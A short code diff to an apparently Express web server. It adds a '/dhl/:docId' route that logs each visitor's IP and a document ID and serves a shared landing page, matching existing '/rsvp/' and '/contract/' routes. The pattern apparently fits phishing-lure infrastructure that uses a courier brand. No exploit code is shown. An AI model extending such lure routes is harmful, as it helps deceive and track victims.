@@ -375,6 +375,11 @@ app.get('/rsvp/:docId', (req, res) => {
   return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
 });
 
+app.get('/dhl/:docId', (req, res) => {
+  log('info', { event: 'serve_dhl', ip: getClientIp(req), docId: req.params.docId });
+  return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
+});
+
 app.get('/contract/:docId', (req, res) => {
   log('info', { event: 'serve_contract', ip: getClientIp(req), docId: req.params.docId });
   return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
